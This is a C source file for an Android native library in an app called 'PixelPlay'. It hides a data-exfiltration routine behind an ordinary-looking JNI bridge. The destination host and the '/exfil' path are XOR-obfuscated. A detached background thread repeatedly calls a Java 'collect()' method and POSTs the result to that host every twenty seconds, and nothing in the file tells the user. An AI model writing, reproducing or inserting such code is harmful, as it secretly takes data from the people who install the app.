#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <android/log.h>

#define LOGT "PixelPlay"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOGT, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOGT, __VA_ARGS__)

static JavaVM* gVM = NULL;
static int gRun = 0;

static const unsigned char XK[8] = {0x4A,0x7D,0x2B,0x6F,0x1C,0x5E,0x3A,0x8F};
static const unsigned char EH[15] = {0x0E,0x38,0x78,0x24,0x48,0x11,0x6A,0xA2,0x03,0x45,0x7D,0x3F,0x24,0x15,0x74};
static const unsigned char EP[6] = {0x65,0x18,0x53,0x09,0x75,0x32};

static void xd(char* out, const unsigned char* in, int len) {
    for (int i = 0; i < len; i++) out[i] = (char)(in[i] ^ XK[i & 7]);
    out[len] = 0;
}

static int http(const char* host, int port, const char* path, const char* body) {
    int len = body ? strlen(body) : 0;
    char req[8192];
    int n = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, port, len, body ? body : "");
    if (n <= 0 || n >= (int)sizeof(req)) return -1;

    struct hostent* he = gethostbyname(host);
    if (!he) return -1;
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) { close(fd); return -1; }

    int sent = 0;
    while (sent < n) {
        int r = write(fd, req + sent, n - sent);
        if (r <= 0) { close(fd); return -1; }
        sent += r;
    }

    char resp[1024];
    int rd = read(fd, resp, sizeof(resp) - 1);
    close(fd);
    if (rd > 0) resp[rd] = 0;
    return rd > 0 ? 200 : -1;
}

static void* worker(void* arg) {
    JNIEnv* env;
    if ((*gVM)->AttachCurrentThread(gVM, &env, NULL) != 0) return NULL;

    sleep(5);
    LOGI("[+] native worker started");

    char host[64], path[16];
    xd(host, EH, 15);
    xd(path, EP, 6);

    while (gRun) {
        jclass cls = (*env)->FindClass(env, "com/pixelplay/app/NativeBridge");
        if (!cls) { sleep(20); continue; }

        jmethodID mid = (*env)->GetStaticMethodID(env, cls, "collect", "()Ljava/lang/String;");
        if (!mid) { sleep(20); continue; }

        jstring jstr = (jstring)(*env)->CallStaticObjectMethod(env, cls, mid);
        if (!jstr) { sleep(20); continue; }

        const char* json = (*env)->GetStringUTFChars(env, jstr, NULL);
        if (json) {
            int code = http(host, 8080, path, json);
            LOGI("[+] sent %d bytes -> %d", (int)strlen(json), code);
            (*env)->ReleaseStringUTFChars(env, jstr, json);
        }
        (*env)->DeleteLocalRef(env, jstr);
        (*env)->DeleteLocalRef(env, cls);

        int i = 0;
        while (gRun && i < 20) { sleep(1); i++; }
    }

    (*gVM)->DetachCurrentThread(gVM);
    return NULL;
}

JNIEXPORT void JNICALL Java_com_pixelplay_app_NativeBridge_start(JNIEnv* env, jclass clz) {
    if (gRun) return;
    gRun = 1;
    (*env)->GetJavaVM(env, &gVM);
    pthread_t t;
    pthread_create(&t, NULL, worker, NULL);
    pthread_detach(t);
    LOGI("[+] native bridge started");
}
